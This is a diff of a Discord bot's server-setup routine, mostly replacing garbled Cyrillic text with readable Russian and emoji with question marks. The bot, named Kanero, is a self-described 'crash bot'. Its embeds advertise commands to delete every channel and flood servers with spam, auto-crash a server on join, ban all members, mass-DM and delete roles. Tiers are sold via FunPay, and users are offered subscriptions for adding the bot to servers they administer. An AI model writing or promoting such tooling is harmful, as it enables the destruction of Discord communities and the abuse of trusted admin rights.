-    await guild.create_text_channel("рџ”‘гѓ»premium-info",  category=cat_prem_cat, overwrites={
+    }, topic="Чат для Premium пользователей")
+    await guild.create_text_channel("???premium-info",  category=cat_prem_cat, overwrites={
         guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(), role_white: _ow(),
         role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="РРЅС„РѕСЂРјР°С†РёСЏ Рѕ Premium вЂ” С‡С‚Рѕ РІС…РѕРґРёС‚, РєР°Рє РёСЃРїРѕР»СЊР·РѕРІР°С‚СЊ")
-    await guild.create_text_channel("рџ› пёЏгѓ»premium-tools", category=cat_prem_cat, overwrites={
+    }, topic="Информация о Premium — что входит, как использовать")
+    await guild.create_text_channel("????premium-tools", category=cat_prem_cat, overwrites={
         guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(), role_white: _ow(),
         role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="!super_nuke, !massban, !massdm, !auto_super_nuke Рё РґСЂСѓРіРёРµ Premium РєРѕРјР°РЅРґС‹")
+    }, topic="!super_nuke, !massban, !massdm, !auto_super_nuke и другие Premium команды")
 
-    # в”Ѓв”Ѓ рџ§Є TESTS вЂ” Tester+ в”Ѓв”Ѓ
-    cat_tests = await guild.create_category("в”Ѓв”Ѓв”Ѓв”Ѓ рџ§Є TESTS в”Ѓв”Ѓв”Ѓв”Ѓ", overwrites={
+    # ?? ?? TESTS — Tester+ ??
+    cat_tests = await guild.create_category("???? ?? TESTS ????", overwrites={
         guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(), role_white: _ow(),
         role_premium: _ow(), role_tester: _ow(True, True),
         role_owner: _ow(True, True), role_dev: _ow(True, True),
     })
-    await guild.create_text_channel("рџђ›гѓ»bug-reports", category=cat_tests, overwrites={
+    await guild.create_text_channel("???bug-reports", category=cat_tests, overwrites={
         guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(), role_white: _ow(),
         role_premium: _ow(), role_tester: _ow(True, True),
         role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="РћС‚С‡С‘С‚С‹ РѕР± РѕС€РёР±РєР°С… Рё Р±Р°РіР°С… вЂ” РїРёС€СѓС‚ Tester")
-    await guild.create_text_channel("рџ§Єгѓ»testing", category=cat_tests, overwrites={
+    }, topic="Отчёты об ошибках и багах — пишут Tester")
+    await guild.create_text_channel("???testing", category=cat_tests, overwrites={
         guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(), role_white: _ow(),
         role_premium: _ow(), role_tester: _ow(True, True),
         role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="РўРµСЃС‚РёСЂРѕРІР°РЅРёРµ РЅРѕРІС‹С… С„СѓРЅРєС†РёР№ вЂ” РѕР±СЃСѓР¶РґРµРЅРёРµ Рё СЂРµР·СѓР»СЊС‚Р°С‚С‹")
-    await guild.create_text_channel("вњ…гѓ»test-results", category=cat_tests, overwrites={
+    }, topic="Тестирование новых функций — обсуждение и результаты")
+    await guild.create_text_channel("??test-results", category=cat_tests, overwrites={
         guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(), role_white: _ow(),
         role_premium: _ow(), role_tester: _ow(True, True),
         role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="Р РµР·СѓР»СЊС‚Р°С‚С‹ С‚РµСЃС‚РёСЂРѕРІР°РЅРёСЏ Рё СЃС‚Р°С‚СѓСЃ РёСЃРїСЂР°РІР»РµРЅРёР№")
+    }, topic="Результаты тестирования и статус исправлений")
 
-    # в”Ѓв”Ѓ пїЅ Р’РћР™РЎР« вЂ” РѕР±С‹С‡РЅС‹Рµ РєР°РЅР°Р»С‹ РґР»СЏ РѕР±С‰РµРЅРёСЏ в”Ѓв”ЃРґ
-    cat_voice = await guild.create_category("в”Ѓв”Ѓв”Ѓв”Ѓ рџ”Љ Р’РћР™РЎР« в”Ѓв”Ѓв”Ѓв”Ѓ", overwrites={
+    # ?? ? ВОЙСЫ — обычные каналы для общения ??д
+    cat_voice = await guild.create_category("???? ?? ВОЙСЫ ????", overwrites={
         guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
         role_guest:  discord.PermissionOverwrite(connect=False, view_channel=True),
         role_user:   discord.PermissionOverwrite(connect=False, view_channel=True),
@@ -2654,8 +2654,8 @@ async def setup(ctx):
         role_dev:    discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
     })
     for i in range(1, 4):
-        await guild.create_voice_channel(f"рџ”Љ voice-{i}", category=cat_voice, user_limit=10)
-    await guild.create_voice_channel("рџ’Ћ premium-voice", category=cat_voice, user_limit=20, overwrites={
+        await guild.create_voice_channel(f"?? voice-{i}", category=cat_voice, user_limit=10)
+    await guild.create_voice_channel("?? premium-voice", category=cat_voice, user_limit=20, overwrites={
         guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
         role_guest:  discord.PermissionOverwrite(connect=False, view_channel=False),
         role_user:   discord.PermissionOverwrite(connect=False, view_channel=False),
@@ -2664,7 +2664,7 @@ async def setup(ctx):
         role_owner:  discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
         role_dev:    discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
     })
-    await guild.create_voice_channel("рџ‘‘ admin-voice", category=cat_voice, overwrites={
+    await guild.create_voice_channel("?? admin-voice", category=cat_voice, overwrites={
         guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
         role_guest:  discord.PermissionOverwrite(connect=False, view_channel=False),
         role_user:   discord.PermissionOverwrite(connect=False, view_channel=False),
@@ -2674,254 +2674,254 @@ async def setup(ctx):
         role_dev:    discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
     })
 
-    # в”Ѓв”Ѓ рџ‘‘ ADMIN вЂ” С‚РѕР»СЊРєРѕ Owner+ в”Ѓв”Ѓ
-    cat_admin = await guild.create_category("в”Ѓв”Ѓв”Ѓв”Ѓ рџ‘‘ ADMIN в”Ѓв”Ѓв”Ѓв”Ѓ", overwrites={
+    # ?? ?? ADMIN — только Owner+ ??
+    cat_admin = await guild.create_category("???? ?? ADMIN ????", overwrites={
         guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
         role_white: _ow(), role_premium: _ow(),
         role_owner: _ow(True, True), role_dev: _ow(True, True),
     })
-    logs_ch = await guild.create_text_channel("рџ“Љгѓ»logs", category=cat_admin, overwrites=admin_ow(), topic="Р›РѕРіРё РЅСЋРєРѕРІ вЂ” !nukelogs")
-    await guild.create_text_channel("рџ’¬гѓ»admin-chat", category=cat_admin, overwrites={
+    logs_ch = await guild.create_text_channel("???logs", category=cat_admin, overwrites=admin_ow(), topic="Логи нюков — !nukelogs")
+    await guild.create_text_channel("???admin-chat", category=cat_admin, overwrites={
         guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
         role_white: _ow(), role_premium: _ow(), role_friend: _ow(),
         role_owner: _ow(True, True), role_dev: _ow(True, True),
-    }, topic="Р§Р°С‚ РґР»СЏ Owner Рё Developer")
+    }, topic="Чат для Owner и Developer")
 
-    # в”Ђв”Ђ 5. РљРѕРЅС‚РµРЅС‚ РІ РєР°РЅР°Р»С‹ в”Ђв”Ђ
+    # -- 5. Контент в каналы --
 
     await welcome_ch.send(embed=discord.Embed(
-        title="рџ‘‹ Р”РѕР±СЂРѕ РїРѕР¶Р°Р»РѕРІР°С‚СЊ РЅР° СЃРµСЂРІРµСЂ Kanero!",
+        title="?? Добро пожаловать на сервер Kanero!",
         description=(
-            "Р‘РѕС‚ Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРё РїРёС€РµС‚ СЃСЋРґР° РїСЂРё РІС…РѕРґРµ РЅРѕРІРѕРіРѕ СѓС‡Р°СЃС‚РЅРёРєР°.\n\n"
-            "**РљР°Рє РЅР°С‡Р°С‚СЊ:**\n"
-            "1. Р—Р°Р№РґРё РІ рџ¤–гѓ»addbot Рё РЅР°РїРёС€Рё Р»СЋР±РѕРµ СЃРѕРѕР±С‰РµРЅРёРµ\n"
-            "2. РџРѕР»СѓС‡РёС€СЊ СЂРѕР»СЊ рџ‘Ґ User Рё РґРѕСЃС‚СѓРї Рє Р±РѕС‚Сѓ\n"
-            "3. Р”РѕР±Р°РІСЊ Р±РѕС‚Р° РЅР° СЃРІРѕР№ СЃРµСЂРІРµСЂ\n\n"
-            "**РљСѓРїРёС‚СЊ White/Premium:** Р·Р°РіР»СЏРЅРё РІ рџЋ«гѓ»РІС‹РґР°С‡Р°-РІР°Р№С‚Р°\n"
-            "**РџРѕРґРґРµСЂР¶РєР°:** СЃРѕР·РґР°Р№ С‚РёРєРµС‚ РІ рџЋ«гѓ»create-ticket\n"
-            "**РЎРµСЂРІРµСЂ:** https://discord.gg/aud6wwYVRd"
+            "Бот автоматически пишет сюда при входе нового участника.\n\n"
+            "**Как начать:**\n"
+            "1. Зайди в ???addbot и напиши любое сообщение\n"
+            "2. Получишь роль ?? User и доступ к боту\n"
+            "3. Добавь бота на свой сервер\n\n"
+            "**Купить White/Premium:** загляни в ???выдача-вайта\n"
+            "**Поддержка:** создай тикет в ???create-ticket\n"
+            "**Сервер:** https://discord.gg/nNTB37QNCG"
         ), color=0x0a0a0a
-    ).set_footer(text="в пёЏ Kanero"))
+    ).set_footer(text="?? Kanero"))
 
-    r = discord.Embed(title="рџ“њ РџСЂР°РІРёР»Р° вЂ” Kanero", color=0x0a0a0a)
-    r.add_field(name="рџ“‹ РџСЂР°РІРёР»Р°", value="**1.** РЈРІР°Р¶Р°Р№ СѓС‡Р°СЃС‚РЅРёРєРѕРІ\n**2.** Р‘РµР· СЃРїР°РјР° Рё С„Р»СѓРґР°\n**3.** Р‘РµР· СЂРµРєР»Р°РјС‹ Р±РµР· СЂР°Р·СЂРµС€РµРЅРёСЏ\n**4.** Р‘РµР· РґРѕРєСЃРёРЅРіР°\n**5.** РЎРѕР±Р»СЋРґР°Р№ Discord ToS\n**6.** Р‘РµР· С‚РѕРєСЃРёРєР° Рё РѕСЃРєРѕСЂР±Р»РµРЅРёР№\n**7.** в›” **РџРѕРїС‹С‚РєР° РєСЂР°С€Р° СЌС‚РѕРіРѕ СЃРµСЂРІРµСЂР° Р·Р°РїСЂРµС‰РµРЅР°**", inline=False)
-    r.add_field(name="рџЋ­ РЈСЂРѕРІРЅРё", value="рџ¤– Kanero В· рџ”§ Developer В· рџ‘‘ Owner В· рџЋ¬ Media В· пїЅпёЏ Moderator В· пїЅрџ’Ћ Premium В· рџ¤ќ Friend В· вњ… White В· рџ‘Ґ User В· рџ‘¤ Guest", inline=False)
-    r.add_field(name="рџ”‘ Р”РѕСЃС‚СѓРї", value="**User (freelist):** РЅР°РїРёС€Рё РІ рџ¤–гѓ»addbot\n**White/Premium:** Р·Р°РіР»СЏРЅРё РІ рџЋ«гѓ»РІС‹РґР°С‡Р°-РІР°Р№С‚Р°\n**РџРѕРґРґРµСЂР¶РєР°:** рџЋ«гѓ»create-ticket", inline=False)
-    r.set_footer(text="в пёЏ Kanero  |  РќР°СЂСѓС€РµРЅРёРµ = Р±Р°РЅ")
+    r = discord.Embed(title="?? Правила — Kanero", color=0x0a0a0a)
+    r.add_field(name="?? Правила", value="**1.** Уважай участников\n**2.** Без спама и флуда\n**3.** Без рекламы без разрешения\n**4.** Без доксинга\n**5.** Соблюдай Discord ToS\n**6.** Без токсика и оскорблений\n**7.** ? **Попытка краша этого сервера запрещена**", inline=False)
+    r.add_field(name="?? Уровни", value="?? Kanero · ?? Developer · ?? Owner · ?? Media · ?? Moderator · ??? Premium · ?? Friend · ? White · ?? User · ?? Guest", inline=False)
+    r.add_field(name="?? Доступ", value="**User (freelist):** напиши в ???addbot\n**White/Premium:** загляни в ???выдача-вайта\n**Поддержка:** ???create-ticket", inline=False)
+    r.set_footer(text="?? Kanero  |  Нарушение = бан")
     await rules_ch.send(embed=r)
 
-    # РћС‚РїСЂР°РІР»СЏРµРј СЃРѕРѕР±С‰РµРЅРёРµ РІ #info
+    # Отправляем сообщение в #info
     info_embed = discord.Embed(
-        title="в„№пёЏ РРЅС„РѕСЂРјР°С†РёСЏ вЂ” Kanero",
+        title="?? Информация — Kanero",
         description=(
-            "**рџ¤– РљР°Рє РґРѕР±Р°РІРёС‚СЊ Р±РѕС‚Р° РЅР° СЃРІРѕР№ СЃРµСЂРІРµСЂ:**\n"
-            "1. РџРѕР»СѓС‡Рё РґРѕСЃС‚СѓРї (СЃРј. РЅРёР¶Рµ)\n"
-            "2. РќР°РїРёС€Рё `!inv` Р±РѕС‚Сѓ РІ Р›РЎ РёР»Рё РЅР° СЃРµСЂРІРµСЂРµ\n"
-            "3. РџРµСЂРµР№РґРё РїРѕ СЃСЃС‹Р»РєРµ Рё РІС‹Р±РµСЂРё СЃРІРѕР№ СЃРµСЂРІРµСЂ\n"
-            "4. **Р’РђР–РќРћ:** Р”Р°Р№ Р±РѕС‚Сѓ СЂРѕР»СЊ СЃ РїСЂР°РІР°РјРё **РђРґРјРёРЅРёСЃС‚СЂР°С‚РѕСЂР°**\n"
-            "5. РџРѕРґРЅРёРјРё СЂРѕР»СЊ Р±РѕС‚Р° **РІС‹С€Рµ РІСЃРµС…** РІ РЅР°СЃС‚СЂРѕР№РєР°С… СЃРµСЂРІРµСЂР°\n"
-            "6. Р“РѕС‚РѕРІРѕ! РСЃРїРѕР»СЊР·СѓР№ РєРѕРјР°РЅРґС‹\n\n"
-            "**рџ“‹ Р‘РµСЃРїР»Р°С‚РЅС‹Р№ РґРѕСЃС‚СѓРї (Freelist):**\n"
-            f"РќР°РїРёС€Рё Р»СЋР±РѕРµ СЃРѕРѕР±С‰РµРЅРёРµ РІ {addbot_ch.mention if addbot_ch else 'рџ¤–гѓ»addbot'}\n"
-            "РџРѕР»СѓС‡РёС€СЊ СЂРѕР»СЊ рџ‘Ґ User Рё РєРѕРјР°РЅРґС‹:\n"
-            "вЂў `!nuke` вЂ” СѓРґР°Р»СЏРµС‚ РІСЃРµ РєР°РЅР°Р»С‹ Рё СЃРѕР·РґР°РµС‚ 30 РЅРѕРІС‹С… СЃРѕ СЃРїР°РјРѕРј\n"
-            "вЂў `!auto_nuke on/off` вЂ” Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРёР№ РєСЂР°С€ РїСЂРё РґРѕР±Р°РІР»РµРЅРёРё Р±РѕС‚Р°\n"
-            "вЂў `!help` вЂ” СЃРїРёСЃРѕРє РІСЃРµС… РєРѕРјР°РЅРґ\n"
-            "вЂў `!changelog` вЂ” РїРѕСЃР»РµРґРЅРёРµ РѕР±РЅРѕРІР»РµРЅРёСЏ\n\n"
-            "**вњ… White (РїР»Р°С‚РЅС‹Р№ РґРѕСЃС‚СѓРї):**\n"
-            "Р’СЃРµ РєРѕРјР°РЅРґС‹ Freelist + РґРѕРїРѕР»РЅРёС‚РµР»СЊРЅРѕ:\n"
-            "вЂў `!nuke [С‚РµРєСЃС‚]` вЂ” РєСЂР°С€ СЃ С‚РІРѕРёРј С‚РµРєСЃС‚РѕРј СЃРїР°РјР°\n"
-            "вЂў `!stop` вЂ” РѕСЃС‚Р°РЅРѕРІРёС‚СЊ РєСЂР°С€\n"
-            "вЂў `!cleanup` вЂ” СѓРґР°Р»РёС‚СЊ РІСЃРµ РєР°РЅР°Р»С‹\n"
-            "вЂў `!rename [РЅР°Р·РІР°РЅРёРµ]` вЂ” РїРµСЂРµРёРјРµРЅРѕРІР°С‚СЊ СЃРµСЂРІРµСЂ\n"
-            "вЂў `!nicks_all [РЅРёРє]` вЂ” СЃРјРµРЅРёС‚СЊ РІСЃРµРј РЅРёРєРё\n"
-            "вЂў `!webhooks` вЂ” СЃРѕР·РґР°С‚СЊ 50 РІРµР±С…СѓРєРѕРІ\n"
-            "вЂў `!clear [С‡РёСЃР»Рѕ]` вЂ” СѓРґР°Р»РёС‚СЊ СЃРѕРѕР±С‰РµРЅРёСЏ\n"
-            "вЂў `!clear_all` вЂ” СѓРґР°Р»РёС‚СЊ Р’РЎР• СЃРѕРѕР±С‰РµРЅРёСЏ РІ РєР°РЅР°Р»Рµ\n\n"
-            "**рџ’Ћ Premium (РјР°РєСЃРёРјР°Р»СЊРЅС‹Р№ РґРѕСЃС‚СѓРї):**\n"
-            "Р’СЃРµ РєРѕРјР°РЅРґС‹ White + РјРѕС‰РЅС‹Рµ С„СѓРЅРєС†РёРё:\n"
-            "вЂў `!super_nuke` вЂ” СѓСЃРёР»РµРЅРЅС‹Р№ РєСЂР°С€ (Р±Р°РЅРёС‚ РІСЃРµС… + СѓРґР°Р»СЏРµС‚ СЂРѕР»Рё)\n"
-            "вЂў `!auto_super_nuke on/off` вЂ” Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРёР№ СЃСѓРїРµСЂ-РєСЂР°С€\n"
-            "вЂў `!massban` вЂ” РјР°СЃСЃРѕРІС‹Р№ Р±Р°РЅ СѓС‡Р°СЃС‚РЅРёРєРѕРІ\n"
-            "вЂў `!massdm [С‚РµРєСЃС‚]` вЂ” РѕС‚РїСЂР°РІРёС‚СЊ Р›РЎ РІСЃРµРј\n"
-            "вЂў `!spam [С‚РµРєСЃС‚] [С‡РёСЃР»Рѕ]` вЂ” СЃРїР°Рј РІ РєР°РЅР°Р»Рµ\n"
-            "вЂў `!pingspam [@СЂРѕР»СЊ] [С‡РёСЃР»Рѕ]` вЂ” СЃРїР°Рј СѓРїРѕРјРёРЅР°РЅРёСЏРјРё\n"
-            "вЂў `!rolesdelete` вЂ” СѓРґР°Р»РёС‚СЊ РІСЃРµ СЂРѕР»Рё\n\n"
-            "**рџ’° РљСѓРїРёС‚СЊ White / Premium:**\n"
-            "РџРµСЂРµР№РґРё РЅР° FunPay Рё РІС‹Р±РµСЂРё С‚Р°СЂРёС„:\n"
+            "**?? Как добавить бота на свой сервер:**\n"
+            "1. Получи доступ (см. ниже)\n"
+            "2. Напиши `!inv` боту в ЛС или на сервере\n"
+            "3. Перейди по ссылке и выбери свой сервер\n"
+            "4. **ВАЖНО:** Дай боту роль с правами **Администратора**\n"
+            "5. Подними роль бота **выше всех** в настройках сервера\n"
+            "6. Готово! Используй команды\n\n"
+            "**?? Бесплатный доступ (Freelist):**\n"
+            f"Напиши любое сообщение в {addbot_ch.mention if addbot_ch else '???addbot'}\n"
+            "Получишь роль ?? User и команды:\n"
+            "• `!nuke` — удаляет все каналы и создает 30 новых со спамом\n"
+            "• `!auto_nuke on/off` — автоматический краш при добавлении бота\n"
+            "• `!help` — список всех команд\n"
+            "• `!changelog` — последние обновления\n\n"
+            "**? White (платный доступ):**\n"
+            "Все команды Freelist + дополнительно:\n"
+            "• `!nuke [текст]` — краш с твоим текстом спама\n"
+            "• `!stop` — остановить краш\n"
+            "• `!cleanup` — удалить все каналы\n"
+            "• `!rename [название]` — переименовать сервер\n"
+            "• `!nicks_all [ник]` — сменить всем ники\n"
+            "• `!webhooks` — создать 50 вебхуков\n"
+            "• `!clear [число]` — удалить сообщения\n"
+            "• `!clear_all` — удалить ВСЕ сообщения в канале\n\n"
+            "**?? Premium (максимальный доступ):**\n"
+            "Все команды White + мощные функции:\n"
+            "• `!super_nuke` — усиленный краш (банит всех + удаляет роли)\n"
+            "• `!auto_super_nuke on/off` — автоматический супер-краш\n"
+            "• `!massban` — массовый бан участников\n"
+            "• `!massdm [текст]` — отправить ЛС всем\n"
+            "• `!spam [текст] [число]` — спам в канале\n"
+            "• `!pingspam [@роль] [число]` — спам упоминаниями\n"
+            "• `!rolesdelete` — удалить все роли\n\n"
+            "**?? Купить White / Premium:**\n"
+            "Перейди на FunPay и выбери тариф:\n"
             "https://funpay.com/users/16928925/ \n\n"
-            "**вќ“ РќСѓР¶РЅР° РїРѕРјРѕС‰СЊ?**\n"
-            f"РЎРѕР·РґР°Р№ С‚РёРєРµС‚: {ticket_ch.mention if ticket_ch else 'рџЋ«гѓ»create-ticket'}\n"
-            "РђРґРјРёРЅРёСЃС‚СЂР°С†РёСЏ РѕС‚РІРµС‚РёС‚ РІ С‚РµС‡РµРЅРёРµ 24 С‡Р°СЃРѕРІ\n\n"
-            "**рџ”— РќР°С€ Discord СЃРµСЂРІРµСЂ:**\n"
-            "https://discord.gg/aud6wwYVRd \n"
-            "Р—Р°С…РѕРґРё Рє РЅР°Рј РІ РіРѕСЃС‚Рё!"
+            "**? Нужна помощь?**\n"
+            f"Создай тикет: {ticket_ch.mention if ticket_ch else '???create-ticket'}\n"
+            "Администрация ответит в течение 24 часов\n\n"
+            "**?? Наш Discord сервер:**\n"
+            "https://discord.gg/nNTB37QNCG \n"
+            "Заходи к нам в гости!"
         ),
         color=0x0a0a0a
     )
-    info_embed.set_footer(text="в пёЏ Kanero  |  РљСЂР°С€-Р±РѕС‚ РґР»СЏ Discord")
+    info_embed.set_footer(text="?? Kanero  |  Краш-бот для Discord")
     await info_ch.send(embed=info_embed)
 
-    a = discord.Embed(title="рџ¤– РџРѕР»СѓС‡РёС‚СЊ РґРѕСЃС‚СѓРї Рє Kanero", color=0x0a0a0a)
-    a.add_field(name="рџ“‹ Freelist (Р±РµСЃРїР»Р°С‚РЅРѕ)", value="РќР°РїРёС€Рё **Р»СЋР±РѕРµ СЃРѕРѕР±С‰РµРЅРёРµ** СЃСЋРґР°\nРџРѕР»СѓС‡РёС€СЊ СЂРѕР»СЊ рџ‘Ґ User:\n`!nuke` В· `!auto_nuke` В· `!help` В· `!changelog`", inline=False)
-    a.add_field(name="вњ… White", value="`!nuke [С‚РµРєСЃС‚]` В· `!stop` В· `!cleanup`\n`!rename` В· `!nicks_all` В· `!webhooks`\nРљСѓРїРёС‚СЊ: [FunPay](https://funpay.com/users/16928925/)", inline=False)
-    a.add_field(name="рџ’Ћ Premium", value="`!super_nuke` В· `!massban` В· `!massdm`\n`!spam` В· `!pingspam` В· `!rolesdelete`\n`!auto_super_nuke` В· `!auto_superpr_nuke`\nРљСѓРїРёС‚СЊ: [FunPay](https://funpay.com/users/16928925/)", inline=False)
-    a.set_footer(text="в пёЏ Kanero  |  РџСЂРѕСЃС‚Рѕ РЅР°РїРёС€Рё С‡С‚Рѕ-РЅРёР±СѓРґСЊ")
+    a = discord.Embed(title="?? Получить доступ к Kanero", color=0x0a0a0a)
+    a.add_field(name="?? Freelist (бесплатно)", value="Напиши **любое сообщение** сюда\nПолучишь роль ?? User:\n`!nuke` · `!auto_nuke` · `!help` · `!changelog`", inline=False)
+    a.add_field(name="? White", value="`!nuke [текст]` · `!stop` · `!cleanup`\n`!rename` · `!nicks_all` · `!webhooks`\nКупить: [FunPay](https://funpay.com/users/16928925/)", inline=False)
+    a.add_field(name="?? Premium", value="`!super_nuke` · `!massban` · `!massdm`\n`!spam` · `!pingspam` · `!rolesdelete`\n`!auto_super_nuke` · `!auto_superpr_nuke`\nКупить: [FunPay](https://funpay.com/users/16928925/)", inline=False)
+    a.set_footer(text="?? Kanero  |  Просто напиши что-нибудь")
     await addbot_ch.send(embed=a)
 
-    # РўРёРєРµС‚С‹ вЂ” РѕС‚РїСЂР°РІР»СЏРµРј РєРЅРѕРїРєСѓ РІ create-ticket
+    # Тикеты — отправляем кнопку в create-ticket
     ticket_embed = discord.Embed(
-        title="рџЋ« РџРѕРґРґРµСЂР¶РєР° вЂ” Kanero",
+        title="?? Поддержка — Kanero",
         description=(
-            "РќСѓР¶РЅР° РїРѕРјРѕС‰СЊ? Р•СЃС‚СЊ РІРѕРїСЂРѕСЃ?\n\n"
-            "РќР°Р¶РјРё РєРЅРѕРїРєСѓ РЅРёР¶Рµ вЂ” Р±РѕС‚ СЃРѕР·РґР°СЃС‚ РїСЂРёРІР°С‚РЅС‹Р№ РєР°РЅР°Р» С‚РѕР»СЊРєРѕ РґР»СЏ С‚РµР±СЏ Рё РєРѕРјР°РЅРґС‹ РїРѕРґРґРµСЂР¶РєРё.\n\n"
-            "вЂў Р’РѕРїСЂРѕСЃС‹ РїРѕ Р±РѕС‚Сѓ\n"
-            "вЂў РџРѕРєСѓРїРєР° White / Premium\n"
-            "вЂў Р–Р°Р»РѕР±С‹ Рё РїСЂРµРґР»РѕР¶РµРЅРёСЏ\n\n"
-            "**рџ‘Ґ РљРѕРјР°РЅРґР° РїРѕРґРґРµСЂР¶РєРё:**\n"
-            "рџ‘‘ Owner вЂў рџ”§ Developer вЂў рџ›ЎпёЏ Moderator вЂў рџ§Є Tester\n\n"
-            "**рџ’Ў Р•СЃС‚СЊ Discord СЃРµСЂРІРµСЂ СЃ СѓС‡Р°СЃС‚РЅРёРєР°РјРё?**\n"
-            "Р•СЃР»Рё Сѓ С‚РµР±СЏ РµСЃС‚СЊ **Р°РґРјРёРЅ РїСЂР°РІР°** РЅР° РєР°РєРѕРј-Р»РёР±Рѕ Discord СЃРµСЂРІРµСЂРµ СЃ СѓС‡Р°СЃС‚РЅРёРєР°РјРё (С…РѕС‚СЊ СЃРєРѕР»СЊРєРѕ), СЃРѕР·РґР°РІР°Р№ С‚РёРєРµС‚!\n"
-            "Р”РѕР±Р°РІР»СЏРµС€СЊ РЅР°С€РµРіРѕ Р±РѕС‚Р° С‚СѓРґР° вЂ” РїРѕР»СѓС‡Р°РµС€СЊ **Р»СѓС‡С€СѓСЋ РїРѕРґРїРёСЃРєСѓ** РІ РѕР±РјРµРЅ рџЋЃ"
+            "Нужна помощь? Есть вопрос?\n\n"
+            "Нажми кнопку ниже — бот создаст приватный канал только для тебя и команды поддержки.\n\n"
+            "• Вопросы по боту\n"
+            "• Покупка White / Premium\n"
+            "• Жалобы и предложения\n\n"
+            "**?? Команда поддержки:**\n"
+            "?? Owner • ?? Developer • ??? Moderator • ?? Tester\n\n"
+            "**?? Есть Discord сервер с участниками?**\n"
+            "Если у тебя есть **админ права** на каком-либо Discord сервере с участниками (хоть сколько), создавай тикет!\n"
+            "Добавляешь нашего бота туда — получаешь **лучшую подписку** в обмен ??"
         ),
         color=0x0a0a0a
     )
-    ticket_embed.set_footer(text="в пёЏ Kanero  |  РћРґРёРЅ С‚РёРєРµС‚ РЅР° РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ")
+    ticket_embed.set_footer(text="?? Kanero  |  Один тикет на пользователя")
     await ticket_ch.send(embed=ticket_embed, view=TicketOpenView())
 
     await logs_ch.send(embed=discord.Embed(
-        title="рџ“Љ Р›РѕРіРё вЂ” Kanero",
-        description="`!nukelogs` вЂ” Р»РѕРіРё РЅСЋРєРѕРІ\n`!list` вЂ” whitelist/premium\n`!fl_list` вЂ” freelist\n`!auto_info` вЂ” СЃС‚Р°С‚СѓСЃ Р°РІС‚Рѕ РЅСЋРєРѕРІ",
+        title="?? Логи — Kanero",
+        description="`!nukelogs` — логи нюков\n`!list` — whitelist/premium\n`!fl_list` — freelist\n`!auto_info` — статус авто нюков",
         color=0x0a0a0a
-    ).set_footer(text="в пёЏ Kanero  |  РўРѕР»СЊРєРѕ Owner+"))
+    ).set_footer(text="?? Kanero  |  Только Owner+"))
 
-    # в”Ђв”Ђ РџРѕСЃС‚РёРј РІ РЅРѕРІРѕСЃС‚Рё Рё sell в”Ђв”Ђ
+    # -- Постим в новости и sell --
     await _post_news_and_sell(guild)
 
     embed = discord.Embed(
-        title="вњ… Kanero вЂ” РЎРµСЂРІРµСЂ РЅР°СЃС‚СЂРѕРµРЅ",
+        title="? Kanero — Сервер настроен",
         description=(
-            "**Р РѕР»Рё:** рџ¤– Kanero В· рџ”§ Developer В· рџ‘‘ Owner В· рџ’Ћ Premium В· вњ… White В· рџ‘Ґ User В· рџ‘¤ Guest В· рџ§Є Tester В· рџ›ЎпёЏ Moderator\n\n"
-            "**РљР°РЅР°Р»С‹:**\n"
-            "рџ‘‹ WELCOME: welcome (РІСЃРµ РІРёРґСЏС‚)\n"
-            "в„№пёЏ INFO: info В· changelog (Guest+)\n"
-            "рџ“ў РћРЎРќРћР’РќРћР•: РїСЂР°РІРёР»Р° В· РЅРѕРІРѕСЃС‚Рё В· addbot В· РјРµРґРёР° В· РїР°СЂС‚РЅС‘СЂСЃС‚РІРѕ В· sell В· РІС‹РґР°С‡Р°-РІР°Р№С‚Р° В· РєРѕРјРїРµРЅСЃР°С†РёСЏ\n"
-            "рџ’¬ Р§РђРўР«: РѕР±С‰РёР№ В· РёРґРµРё В· create-ticket (Guest+)\n"
-            "рџ“‹ FREELIST: freelist-chat В· РїРѕРјРѕС‰СЊ (User+)\n"
-            "вњ… WHITE: white-chat В· РєРѕРјР°РЅРґС‹ (White+)\n"
-            "рџ’Ћ PREMIUM: premium-chat В· premium-info В· premium-tools (Premium+)\n"
-            "рџ§Є TESTS: bug-reports В· testing В· test-results (Tester+)\n"
-            "рџ”Љ Р’РћР™РЎР«: voice-1/2/3 В· premium-voice В· admin-voice\n"
-            "рџ‘‘ ADMIN: logs В· admin-chat (Owner+)\n\n"
-            f"РђРІС‚Рѕ-СЂРѕР»СЊ РїСЂРё РІС…РѕРґРµ: {f'<@&{role_guest.id}>' if role_guest else 'рџ‘¤ Guest'}\n"
-            "Р РѕР»СЊ рџ‘Ґ User РІС‹РґР°С‘С‚СЃСЏ РїСЂРё РЅР°РїРёСЃР°РЅРёРё РІ addbot."
+            "**Роли:** ?? Kanero · ?? Developer · ?? Owner · ?? Premium · ? White · ?? User · ?? Guest · ?? Tester · ??? Moderator\n\n"
+            "**Каналы:**\n"
+            "?? WELCOME: welcome (все видят)\n"
+            "?? INFO: info · changelog (Guest+)\n"
+            "?? ОСНОВНОЕ: правила · новости · addbot · медиа · партнёрство · sell · выдача-вайта · компенсация\n"
+            "?? ЧАТЫ: общий · идеи · create-ticket (Guest+)\n"
+            "?? FREELIST: freelist-chat · помощь (User+)\n"
+            "? WHITE: white-chat · команды (White+)\n"
